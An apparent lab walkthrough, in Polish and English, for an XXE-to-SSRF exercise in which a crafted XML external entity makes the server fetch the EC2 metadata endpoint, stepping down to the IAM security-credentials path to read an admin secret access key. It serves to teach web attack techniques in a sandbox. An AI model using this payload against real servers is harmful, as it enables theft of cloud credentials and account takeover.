This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

1. Wchodzimy w zadanie na stronie i uruchamiamy burpa, wchodzimy w kategorie i klikamy check stock, następnie wchodzimy w http history i szukamy POST URL:/product/stock połączenie wysyłamy do repetera
2. Widzimy, że jest xml, dodajemy linijkę zgodnie z tym co mieliśmy podane w danych w zadaniu, czyli: <!DOCTYPE cośtamcośtam [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>  Dlaczego takie ip? bo jest ono potrzebne by wydobyć metadate pod produktem wpisujemy &ssrf;
3. Klikamy send i otrzymujemy 400 bad request z powiadomieniem invalid product id do naszeej linijki dopisujemy latest i metadata, powinno to wyglądać tak: <!DOCTYPE cośtamcośtam [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"> ]> klikamy send i otrzymujemy 400 bad request z powiadomieniem, że nie mamy iam
4. Dopisujemy iam do linijki <!DOCTYPE cośtamcośtam [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]> klikamy ok, otrzymujemy 400 bad request z powiadomieniem, że brakuje security-credentials, a więc dopisujemy to do naszej linijki. 
5. [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials"> ]> klikamy send i tym razem nie mamy admina, więc ponawiamy krok i wpisujemy dalej admina [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]> klikamy send i mam 400, ale w responsie mamy acces key i secret accees key 

ENG:

1.Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2.Insert the following external entity definition in between the XML declaration and the stockCheck element:

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
3.Replace the productId number with a reference to the external entity: &xxe;. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
4.Iteratively update the URL in the DTD to explore the API until you reach /latest/meta-data/iam/security-credentials/admin. This should return JSON containing the SecretAccessKey.